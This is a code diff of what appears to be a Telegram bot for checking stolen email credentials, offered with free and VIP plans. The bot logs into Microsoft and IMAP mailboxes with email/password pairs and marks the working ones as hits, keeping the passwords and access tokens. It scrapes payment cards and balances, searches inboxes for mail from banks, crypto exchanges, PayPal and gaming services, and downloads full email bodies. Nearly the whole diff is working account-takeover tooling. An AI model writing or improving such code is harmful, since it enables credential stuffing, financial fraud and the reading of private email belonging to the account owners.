@@ -14,6 +14,8 @@ import base64
 import cloudscraper
 import random
 import secrets
+import email as email_lib
+from email.header import decode_header as decode_hdr
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta
 
@@ -611,12 +613,20 @@ class UnifiedChecker:
                 pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                 r_pay = self.session.get(pay_url, headers=h, timeout=15)
                 if r_pay.status_code == 200:
-                    m1 = re.search(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?)', r_pay.text)
-                    if m1:
-                        ms_data["balance_amount"] = m1.group(1)
-                    m2 = re.search(r'"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
-                    if m2:
-                        ms_data["balance_currency"] = m2.group(1)
+                    # Capture multiple balances
+                    balances = re.findall(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
+                    if balances:
+                        # sum up or list all balances with their currencies
+                        ms_data["balances"] = [f"{amt} {cur}" for amt, cur in balances]
+                        # for backward compatibility, keep balance_amount/currency of the first one
+                        ms_data["balance_amount"] = balances[0][0]
+                        ms_data["balance_currency"] = balances[0][1]
+                    
+                    # Capture cards (Visa, Master, etc.)
+                    cards = re.findall(r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)".*?"lastFourDigits"\s*:\s*"([^"]*)"', r_pay.text, re.DOTALL)
+                    if cards:
+                        ms_data["cards"] = [f"{fam} {name} (***{last})" for fam, name, last in cards]
+                    
                     m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                     if m3:
                         ms_data["rewards_points"] = m3.group(1)
@@ -832,7 +842,7 @@ class UnifiedChecker:
                         {"Term": {"DistinguishedFolderName": "Inbox"}}
                     ]},
                     "From": 0,
-                    "Query": {"QueryString": query},
+                    "Query": {"QueryString": query_str},
                     "Size": 50,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                 }]
@@ -929,6 +939,47 @@ class UnifiedChecker:
             pass
         return out, nf, fb
 
+    def check_service(self, access_token, cid, query_str):
+        try:
+            url = "https://outlook.live.com/search/api/v2/query"
+            h = {
+                'User-Agent': 'Outlook-Android/2.0',
+                'Authorization': f'Bearer {access_token}',
+                'X-AnchorMailbox': f'CID:{cid}',
+                'Content-Type': 'application/json'
+            }
+            payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {"Or": [
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
+                        {"Term": {"DistinguishedFolderName": "Inbox"}}
+                    ]},
+                    "From": 0,
+                    "Query": {"QueryString": query_str},
+                    "Size": 50,
+                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+                }]
+            }
+            r = self.session.post(url, json=payload, headers=h, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                total = 0
+                for es in data.get('EntitySets', []):
+                    for rs in es.get('ResultSets', []):
+                        total = rs.get('Total', 0)
+                        break
+                return total > 0
+            return False
+        except:
+            return False
+
     def check(self, email, password):
         try:
             auth = self._ms_hard_login(email, password)
@@ -939,7 +990,59 @@ class UnifiedChecker:
             country, name = self._profile(at, cid)
             msg_count = self._graph_msg_count(at)
             msr = self.check_microsoft_subscriptions(email, password, at, cid)
-            services, nf, fb = self._scan_services(at, cid, email)
+            
+            # Search all services from list
+            found_services = {}
+            services_to_check = {
+                'advertise-support.facebook.com': 'Facebook',
+                'mail.instagram.com': 'Instagram',
+                'account.tiktok.com': 'TikTok',
+                'x.com': 'Twitter',
+                'youtube.com': 'YouTube',
+                'discordapp.com': 'Discord',
+                'spotify.com': 'Spotify',
+                'netflix.com': 'Netflix',
+                'steampowered.com': 'Steam',
+                'epicgames.com': 'Epic Games',
+                'riotgames.com': 'Riot Games',
+                'ubisoft.com': 'Ubisoft',
+                'blizzard.com': 'Blizzard',
+                'rockstargames.com': 'Rockstar',
+                'nintendo.com': 'Nintendo',
+                'roblox.com': 'Roblox',
+                'paypal.com': 'PayPal',
+                'binance.com': 'Binance',
+                'amazon.com': 'Amazon',
+                'ebay.com': 'eBay',
+                'aliexpress.com': 'AliExpress',
+                'temu.com': 'Temu',
+                'shein.com': 'Shein',
+                'hulu.com': 'Hulu',
+                'disneyplus.com': 'Disney+',
+                'viu.com': 'Viu',
+                'tubitv.com': 'Tubi TV',
+                'crunchyroll.com': 'Crunchyroll',
+                'ea.com': 'EA Sports',
+                'battlenet.com': 'Battle.net',
+                'apple.com': 'Apple',
+                'icloud.com': 'iCloud',
+                'canva.com': 'Canva',
+                'github.com': 'GitHub',
+                'gitlab.com': 'GitLab',
+                'bitbucket.com': 'Bitbucket',
+                'replit.com': 'Replit',
+                'azure.microsoft.com': 'Azure',
+                'metrobank.com.ph': 'Metrobank',
+                'landbank.com': 'LandBank',
+                'securitybank.com': 'Security Bank',
+                'coinbase.com': 'Coinbase',
+                'etoro.com': 'eToro',
+            }
+            
+            for q, svc_name in services_to_check.items():
+                if self.check_service(at, cid, q):
+                    found_services[svc_name] = True
+            
             result = {
                 "status": "HIT",
                 "country": country,
@@ -947,12 +1050,10 @@ class UnifiedChecker:
                 "msg_count": msg_count,
                 "email": email,
                 "password": password,
-                "services": services,
+                "services": found_services,
                 "_access_token": at,
                 "_refresh_token": auth.get("refresh_token", ""),
                 **msr,
-                **nf,
-                **fb,
                 "psn_status": "NONE",
                 "steam_status": "NONE",
                 "supercell_status": "NONE",
@@ -969,15 +1070,18 @@ class UnifiedChecker:
 def build_balance_text(ms_data):
     parts = []
     if isinstance(ms_data, dict):
-        if "balance_amount" in ms_data:
+        if "balances" in ms_data:
+            parts.extend(ms_data["balances"])
+        elif "balance_amount" in ms_data:
             amt = ms_data.get("balance_amount")
             cur = ms_data.get("balance_currency") or ""
             parts.append(format_currency(amt, cur or None))
-        elif "balance" in ms_data:
-            parts.append(format_currency(ms_data.get("balance"), None))
+        
+        if "cards" in ms_data:
+            parts.extend(ms_data["cards"])
+            
         if "rewards_points" in ms_data:
             parts.append(f"Rewards:{ms_data['rewards_points']}")
-    # Ensure default visible value
     return " | ".join([p for p in parts if p]) if parts else "0.0 USD"
 
 def format_result(res):
@@ -1023,7 +1127,7 @@ def format_full_details(res):
     ms = res.get("ms_data", {}) or {}
     btxt = build_balance_text(ms)
     if btxt:
-        lines.append(f"Balance: {btxt}")
+        lines.append(f"Microsoft: {btxt}")
     if res.get("psn_status") == "HAS_ORDERS":
         cnt = res.get("psn_emails_count", 0)
         orders = res.get("psn_orders", 0)
@@ -1067,6 +1171,245 @@ def format_full_details(res):
     if len(out) > 3900:
         out = out[:3900] + "\n..."
     return out
+
+# ------------------- IMAP Checker -------------------
+IMAP_SERVERS = {
+    "gmail.com": {"host": "imap.gmail.com", "port": 993},
+    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993},
+    "icloud.com": {"host": "imap.mail.me.com", "port": 993},
+    "aol.com": {"host": "imap.aol.com", "port": 993},
+    "zoho.com": {"host": "imap.zoho.com", "port": 993},
+    "fastmail.com": {"host": "imap.fastmail.com", "port": 993},
+    "yandex.com": {"host": "imap.yandex.com", "port": 993},
+    "yandex.ru": {"host": "imap.yandex.ru", "port": 993},
+    "mail.ru": {"host": "imap.mail.ru", "port": 993},
+    "bk.ru": {"host": "imap.mail.ru", "port": 993},
+    "list.ru": {"host": "imap.mail.ru", "port": 993},
+    "inbox.ru": {"host": "imap.mail.ru", "port": 993},
+    "gmx.net": {"host": "imap.gmx.net", "port": 993},
+    "gmx.com": {"host": "imap.gmx.com", "port": 993},
+    "web.de": {"host": "imap.web.de", "port": 993},
+    "t-online.de": {"host": "imap.t-online.de", "port": 993},
+    "qq.com": {"host": "imap.qq.com", "port": 993},
+    "163.com": {"host": "imap.163.com", "port": 993},
+    "126.com": {"host": "imap.126.com", "port": 993},
+    "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
+    "proton.me": {"host": "imap.proton.me", "port": 993},
+}
+
+IMAP_SERVICES = {
+    "Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com",
+    "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com",
+    "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com",
+    "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com",
+    "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv",
+    "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com",
+    "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com",
+    "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com",
+    "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com",
+    "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com",
+    "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com",
+    "Snapchat": "snapchat.com", "Pinterest": "pinterest.com",
+}
+
+def _decode_mime(text):
+    if not text:
+        return ""
+    parts = decode_hdr(text)
+    result = []
+    for part, enc in parts:
+        if isinstance(part, bytes):
+            try:
+                result.append(part.decode(enc or 'utf-8', errors='ignore'))
+            except:
+                result.append(part.decode('utf-8', errors='ignore'))
+        else:
+            result.append(str(part))
+    return ''.join(result)
+
+def _get_imap_config(email_addr):
+    domain = email_addr.lower().split('@')[-1]
+    if domain in IMAP_SERVERS:
+        return IMAP_SERVERS[domain]
+    return {"host": f"imap.{domain}", "port": 993}
+
+def _imap_connect(email_addr, password):
+    cfg = _get_imap_config(email_addr)
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'],
+                                  ssl_context=ctx)
+        mail.socket().settimeout(12)
+        res, _ = mail.login(email_addr, password)
+        if res != 'OK':
+            try: mail.logout()
+            except: pass
+            return None
+        return mail
+    except (imaplib.IMAP4.error, ssl.SSLError,
+            OSError, ConnectionRefusedError,
+            TimeoutError, Exception):
+        return None
+
+class ImapChecker:
+    def __init__(self):
+        self.hits = 0
+        self._lock = threading.Lock()
+
+    def check(self, email_addr, password):
+        try:
+            mail = _imap_connect(email_addr, password)
+            if not mail:
+                return {"status": "BAD"}
+            # Count inbox
+            msg_count = 0
+            try:
+                r, _ = mail.select('INBOX')
+                if r == 'OK':
+                    r2, data2 = mail.search(None, 'ALL')
+                    if r2 == 'OK' and data2 and data2[0]:
+                        msg_count = len(data2[0].split())
+            except Exception:
+                pass
+            # Scan services
+            services_found = self._scan_services(mail)
+            try:
+                mail.logout()
+            except Exception:
+                pass
+            with self._lock:
+                self.hits += 1
+            return {
+                "status": "HIT",
+                "email": email_addr,
+                "country": "",
+                "name": "",
+                "msg_count": msg_count,
+                "xbox": {"status": "N/A"},
+                "ms_data": {},
+                "services": {svc: True for svc in services_found},
+                "imap_mode": True,
+                "psn_status": "NONE",
+                "steam_status": "NONE",
+                "supercell_status": "NONE",
+                "tiktok_status": "NONE",
+                "minecraft_status": "NONE",
+                "hypixel_status": "NOT_FOUND",
+            }
+        except Exception:
+            return {"status": "BAD"}
+
+    def _scan_services(self, mail):
+        found = set()
+        try:
+            r, data = mail.search(None, 'ALL')
+            if r != 'OK' or not data[0]:
+                return list(found)
+            ids = data[0].split()
+            for eid in ids[-500:]:
+                try:
+                    r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
+                    if r2 != 'OK' or not mdata or not mdata[0]:
+                        continue
+                    raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
+                    msg = email_lib.message_from_bytes(raw)
+                    sender = _decode_mime(msg.get('From', '')).lower()
+                    for svc, pattern in IMAP_SERVICES.items():
+                        if pattern in sender:
+                            found.add(svc)
+                except:
+                    continue
+        except:
+            pass
+        return list(found)
+
+def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
+    """Fetch last N emails from a folder via IMAP"""
+    emails = []
+    try:
+        mail = _imap_connect(email_addr, password)
+        if not mail:
+            return None, "Login failed (wrong password or domain not reachable)"
+        r, _ = mail.select(folder, readonly=True)
+        if r != 'OK':
+            # Try common alternate folder names
+            alt_names = {
+                'Trash': ['Deleted Items', 'Deleted', '[Gmail]/Trash',
+                           'INBOX.Trash', 'Корзина'],
+                'Sent':  ['Sent Items', '[Gmail]/Sent Mail',
+                           'INBOX.Sent', 'Отправленные'],
+                'Junk':  ['Spam', '[Gmail]/Spam', 'INBOX.Spam',
+                           'Bulk Mail', 'Нежелательная почта'],
+                'Drafts':['[Gmail]/Drafts', 'INBOX.Drafts'],
+            }
+            opened = False
+            for alt in alt_names.get(folder, []):
+                try:
+                    r2, _ = mail.select(alt, readonly=True)
+                    if r2 == 'OK':
+                        opened = True
+                        break
+                except Exception:
+                    continue
+            if not opened:
+                try: mail.logout()
+                except: pass
+                return None, f"Cannot open folder: {folder}"
+        r2, data2 = mail.search(None, 'ALL')
+        if r2 != 'OK':
+            mail.logout()
+            return None, "Search failed"
+        ids = data2[0].split() if data2[0] else []
+        # Get last `count` emails
+        fetch_ids = ids[-count:] if len(ids) > count else ids
+        fetch_ids = list(reversed(fetch_ids))  # newest first
+        for eid in fetch_ids:
+            if cancel_event and cancel_event.is_set():
+                break
+            try:
+                r3, mdata = mail.fetch(eid, '(RFC822)')
+                if r3 != 'OK' or not mdata:
+                    continue
+                raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
+                msg = email_lib.message_from_bytes(raw)
+                subject = _decode_mime(msg.get('Subject', '(No Subject)'))
+                sender = _decode_mime(msg.get('From', ''))
+                date = msg.get('Date', '')
+                body = ''
+                if msg.is_multipart():
+                    for part in msg.walk():
+                        ct = part.get_content_type()
+                        if ct == 'text/plain':
+                            try:
+                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                break
+                            except:
+                                pass
+                        elif ct == 'text/html' and not body:
+                            try:
+                                html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                body = re.sub(r'<[^>]+>', ' ', html)
+                            except:
+                                pass
+                else:
+                    try:
+                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
+                    except:
+                        body = str(msg.get_payload())
+                emails.append({
+                    'subject': subject[:120],
+                    'from': sender[:80],
+                    'date': date[:40],
+                    'body': body[:3000],
+                })
+            except:
+                continue
+        mail.logout()
+        return emails, None
+    except Exception as e:
+        return None, str(e)
 
 class ScanSession:
     def __init__(self, chat_id):
@@ -1414,7 +1757,23 @@ class BotApp:
                 sess = ScanSession(chat_id)
                 self.sessions[chat_id] = sess
         
-        # split domains
+        sess.pending_accounts = accounts
+
+        if sess.is_fortnite:
+            # For Fortnite, we skip domain splitting and go straight to plan selection or scan
+            if chat_id in vip_users:
+                self._handle_vip_flow(chat_id, sess)
+            else:
+                kb = {
+                    "inline_keyboard": [
+                        [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
+                        [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
+                    ]
+                }
+                send_message(chat_id, "Choose your plan to start Fortnite scan:", reply_markup=kb)
+            return
+
+        # split domains for Mail Access mode
         ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
         sess.accounts_microsoft = []
         sess.accounts_another = []
@@ -1662,249 +2021,3 @@ class BotApp:
 
 if __name__ == "__main__":
     BotApp().run()
-
-
-
-# ------------------- IMAP Checker -------------------
-import imaplib
-import email as email_lib
-from email.header import decode_header as decode_hdr
-import ssl
-
-IMAP_SERVERS = {
-    "gmail.com": {"host": "imap.gmail.com", "port": 993},
-    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993},
-    "icloud.com": {"host": "imap.mail.me.com", "port": 993},
-    "aol.com": {"host": "imap.aol.com", "port": 993},
-    "zoho.com": {"host": "imap.zoho.com", "port": 993},
-    "fastmail.com": {"host": "imap.fastmail.com", "port": 993},
-    "yandex.com": {"host": "imap.yandex.com", "port": 993},
-    "yandex.ru": {"host": "imap.yandex.ru", "port": 993},
-    "mail.ru": {"host": "imap.mail.ru", "port": 993},
-    "bk.ru": {"host": "imap.mail.ru", "port": 993},
-    "list.ru": {"host": "imap.mail.ru", "port": 993},
-    "inbox.ru": {"host": "imap.mail.ru", "port": 993},
-    "gmx.net": {"host": "imap.gmx.net", "port": 993},
-    "gmx.com": {"host": "imap.gmx.com", "port": 993},
-    "web.de": {"host": "imap.web.de", "port": 993},
-    "t-online.de": {"host": "imap.t-online.de", "port": 993},
-    "qq.com": {"host": "imap.qq.com", "port": 993},
-    "163.com": {"host": "imap.163.com", "port": 993},
-    "126.com": {"host": "imap.126.com", "port": 993},
-    "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
-    "proton.me": {"host": "imap.proton.me", "port": 993},
-}
-
-IMAP_SERVICES = {
-    "Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com",
-    "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com",
-    "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com",
-    "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com",
-    "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv",
-    "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com",
-    "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com",
-    "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com",
-    "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com",
-    "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com",
-    "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com",
-    "Snapchat": "snapchat.com", "Pinterest": "pinterest.com",
-}
-
-def _decode_mime(text):
-    if not text:
-        return ""
-    parts = decode_hdr(text)
-    result = []
-    for part, enc in parts:
-        if isinstance(part, bytes):
-            try:
-                result.append(part.decode(enc or 'utf-8', errors='ignore'))
-            except:
-                result.append(part.decode('utf-8', errors='ignore'))
-        else:
-            result.append(str(part))
-    return ''.join(result)
-
-def _get_imap_config(email_addr):
-    domain = email_addr.lower().split('@')[-1]
-    if domain in IMAP_SERVERS:
-        return IMAP_SERVERS[domain]
-    return {"host": f"imap.{domain}", "port": 993}
-
-def _imap_connect(email_addr, password):
-    cfg = _get_imap_config(email_addr)
-    try:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'],
-                                  ssl_context=ctx)
-        mail.socket().settimeout(12)
-        res, _ = mail.login(email_addr, password)
-        if res != 'OK':
-            try: mail.logout()
-            except: pass
-            return None
-        return mail
-    except (imaplib.IMAP4.error, ssl.SSLError,
-            OSError, ConnectionRefusedError,
-            TimeoutError, Exception):
-        return None
-
-class ImapChecker:
-    def __init__(self):
-        self.hits = 0
-        self._lock = threading.Lock()
-
-    def check(self, email_addr, password):
-        try:
-            mail = _imap_connect(email_addr, password)
-            if not mail:
-                return {"status": "BAD"}
-            # Count inbox
-            msg_count = 0
-            try:
-                r, _ = mail.select('INBOX')
-                if r == 'OK':
-                    r2, data2 = mail.search(None, 'ALL')
-                    if r2 == 'OK' and data2 and data2[0]:
-                        msg_count = len(data2[0].split())
-            except Exception:
-                pass
-            # Scan services
-            services_found = self._scan_services(mail)
-            try:
-                mail.logout()
-            except Exception:
-                pass
-            with self._lock:
-                self.hits += 1
-            return {
-                "status": "HIT",
-                "email": email_addr,
-                "country": "",
-                "name": "",
-                "msg_count": msg_count,
-                "xbox": {"status": "N/A"},
-                "ms_data": {},
-                "services": {svc: True for svc in services_found},
-                "imap_mode": True,
-                "psn_status": "NONE",
-                "steam_status": "NONE",
-                "supercell_status": "NONE",
-                "tiktok_status": "NONE",
-                "minecraft_status": "NONE",
-                "hypixel_status": "NOT_FOUND",
-            }
-        except Exception:
-            return {"status": "BAD"}
-
-    def _scan_services(self, mail):
-        found = set()
-        try:
-            r, data = mail.search(None, 'ALL')
-            if r != 'OK' or not data[0]:
-                return list(found)
-            ids = data[0].split()
-            for eid in ids[-500:]:
-                try:
-                    r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
-                    if r2 != 'OK' or not mdata or not mdata[0]:
-                        continue
-                    raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
-                    msg = email_lib.message_from_bytes(raw)
-                    sender = _decode_mime(msg.get('From', '')).lower()
-                    for svc, pattern in IMAP_SERVICES.items():
-                        if pattern in sender:
-                            found.add(svc)
-                except:
-                    continue
-        except:
-            pass
-        return list(found)
-
-def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
-    """Fetch last N emails from a folder via IMAP"""
-    emails = []
-    try:
-        mail = _imap_connect(email_addr, password)
-        if not mail:
-            return None, "Login failed (wrong password or domain not reachable)"
-        r, _ = mail.select(folder, readonly=True)
-        if r != 'OK':
-            # Try common alternate folder names
-            alt_names = {
-                'Trash': ['Deleted Items', 'Deleted', '[Gmail]/Trash',
-                           'INBOX.Trash', 'Корзина'],
-                'Sent':  ['Sent Items', '[Gmail]/Sent Mail',
-                           'INBOX.Sent', 'Отправленные'],
-                'Junk':  ['Spam', '[Gmail]/Spam', 'INBOX.Spam',
-                           'Bulk Mail', 'Нежелательная почта'],
-                'Drafts':['[Gmail]/Drafts', 'INBOX.Drafts'],
-            }
-            opened = False
-            for alt in alt_names.get(folder, []):
-                try:
-                    r2, _ = mail.select(alt, readonly=True)
-                    if r2 == 'OK':
-                        opened = True
-                        break
-                except Exception:
-                    continue
-            if not opened:
-                try: mail.logout()
-                except: pass
-                return None, f"Cannot open folder: {folder}"
-        r2, data2 = mail.search(None, 'ALL')
-        if r2 != 'OK':
-            mail.logout()
-            return None, "Search failed"
-        ids = data2[0].split() if data2[0] else []
-        # Get last `count` emails
-        fetch_ids = ids[-count:] if len(ids) > count else ids
-        fetch_ids = list(reversed(fetch_ids))  # newest first
-        for eid in fetch_ids:
-            if cancel_event and cancel_event.is_set():
-                break
-            try:
-                r3, mdata = mail.fetch(eid, '(RFC822)')
-                if r3 != 'OK' or not mdata:
-                    continue
-                raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
-                msg = email_lib.message_from_bytes(raw)
-                subject = _decode_mime(msg.get('Subject', '(No Subject)'))
-                sender = _decode_mime(msg.get('From', ''))
-                date = msg.get('Date', '')
-                body = ''
-                if msg.is_multipart():
-                    for part in msg.walk():
-                        ct = part.get_content_type()
-                        if ct == 'text/plain':
-                            try:
-                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
-                                break
-                            except:
-                                pass
-                        elif ct == 'text/html' and not body:
-                            try:
-                                html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
-                                body = re.sub(r'<[^>]+>', ' ', html)
-                            except:
-                                pass
-                else:
-                    try:
-                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
-                    except:
-                        body = str(msg.get_payload())
-                emails.append({
-                    'subject': subject[:120],
-                    'from': sender[:80],
-                    'date': date[:40],
-                    'body': body[:3000],
-                })
-            except:
-                continue
-        mail.logout()
-        return emails, None
-    except Exception as e:
-        return None, str(e)
